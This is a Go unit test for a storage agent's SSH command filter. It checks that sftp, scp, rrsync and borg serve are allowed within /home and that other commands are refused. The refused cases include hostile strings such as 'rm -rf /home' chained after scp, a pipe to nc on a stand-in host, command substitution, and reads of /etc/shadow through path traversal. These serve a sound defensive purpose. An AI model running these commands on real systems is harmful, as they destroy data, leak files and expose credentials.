package storageagent_test

import (
	"path"
	"slices"
	"strings"
	"testing"

	"github.com/webcodingcat/hlab/internal/storageagent"
)

// hasArg reports whether argv holds flag with value, as two arguments or
// as flag=value.
func hasArg(argv []string, flag, value string) bool {
	for i, a := range argv {
		if a == flag+"="+value || (a == flag && i+1 < len(argv) && argv[i+1] == value) {
			return true
		}
	}
	return false
}

func testPort23(t *testing.T) {
	sftp := func(t *testing.T, argv []string, _ bool) {
		if path.Base(argv[0]) != "sftp-server" {
			t.Errorf("argv = %q, want sftp-server", argv)
		}
	}
	scp := func(flag string) func(*testing.T, []string, bool) {
		return func(t *testing.T, argv []string, _ bool) {
			if path.Base(argv[0]) != "scp" || !slices.Contains(argv, flag) {
				t.Errorf("argv = %q, want scp %s", argv, flag)
			}
		}
	}
	rrsync := func(t *testing.T, argv []string, readOnly bool) {
		if path.Base(argv[0]) != "rrsync" || argv[len(argv)-1] != "/home" ||
			slices.Contains(argv, "-ro") != readOnly {
			t.Errorf("argv = %q, want rrsync restricted to /home, -ro only for read-only", argv)
		}
	}
	borg := func(t *testing.T, argv []string, _ bool) {
		if !strings.HasPrefix(path.Base(argv[0]), "borg") || !slices.Contains(argv, "serve") ||
			!hasArg(argv, "--restrict-to-path", "/home") {
			t.Errorf("argv = %q, want borg serve --restrict-to-path /home", argv)
		}
		for i, a := range argv {
			if strings.HasPrefix(a, "--restrict-to-path") && !hasArg(argv[i:i+min(2, len(argv)-i)], "--restrict-to-path", "/home") {
				t.Errorf("argv = %q restricts to a path other than /home", argv)
			}
		}
	}

	cases := []struct {
		name     string
		readOnly bool
		command  string
		check    func(*testing.T, []string, bool) // nil: refused
	}{
		{name: "internal_sftp", command: "internal-sftp", check: sftp},
		{name: "sftp_server", command: "/usr/lib/openssh/sftp-server", check: sftp},
		{name: "scp_upload", command: "scp -t backup/file.tar", check: scp("-t")},
		{name: "scp_upload_home", command: "scp -t /home/file.tar", check: scp("-t")},
		{name: "scp_download", command: "scp -f backup/file.tar", check: scp("-f")},
		{name: "scp_download_read_only", readOnly: true, command: "scp -f backup/file.tar", check: scp("-f")},
		{name: "rsync", command: "rsync --server -vlogDtpre.iLsfxCIvu . backup/", check: rrsync},
		{name: "rsync_read_only", readOnly: true, command: "rsync --server --sender -vlogDtpre.iLsfxCIvu . backup/", check: rrsync},
		{name: "borg", command: "borg serve --umask=077 --info", check: borg},
		{name: "borg_1.1", command: "borg-1.1 serve --umask=077 --info", check: borg},
		{name: "borg_1.2", command: "borg-1.2 serve --umask=077 --info", check: borg},
		{name: "borg_1.4", command: "borg-1.4 serve --umask=077 --info", check: borg},

		{name: "no_command", command: ""},
		{name: "shell", command: "bash"},
		{name: "other_command", command: "ls -la"},
		{name: "sh_c", command: "sh -c 'scp -t x'"},
		{name: "borg_other_version", command: "borg-1.3 serve --umask=077"},
		{name: "borg_not_serve", command: "borg list /home/repo"},
		{name: "borg_widened_path", command: "borg serve --restrict-to-path /"},
		{name: "scp_without_mode", command: "scp backup/file.tar"},
		{name: "scp_upload_read_only", readOnly: true, command: "scp -t backup/file.tar"},
		{name: "semicolon", command: "scp -t x; rm -rf /home"},
		{name: "and", command: "rsync --server . backup/ && id"},
		{name: "pipe", command: "scp -f x | nc evil 1"},
		{name: "substitution", command: "scp -t $(id)"},
		{name: "backticks", command: "scp -t `id`"},
		{name: "redirect", command: "scp -f x > /home/y"},
		{name: "absolute_outside", command: "scp -f /etc/shadow"},
		{name: "dotdot", command: "scp -t ../../etc/x"},
		{name: "dotdot_below_home", command: "scp -f /home/../etc/shadow"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			argv, err := storageagent.Port23("u100000", c.readOnly, c.command)
			if c.check == nil {
				if err == nil {
					t.Fatalf("Port23(%q) = %q, want it refused", c.command, argv)
				}
				if !strings.Contains(err.Error(), "Command not allowed") {
					t.Errorf("error = %q, want \"Command not allowed\"", err)
				}
				return
			}
			if err != nil {
				t.Fatalf("Port23(%q): %v", c.command, err)
			}
			if len(argv) == 0 {
				t.Fatalf("Port23(%q) returned no argv", c.command)
			}
			c.check(t, argv, c.readOnly)
		})
	}
}
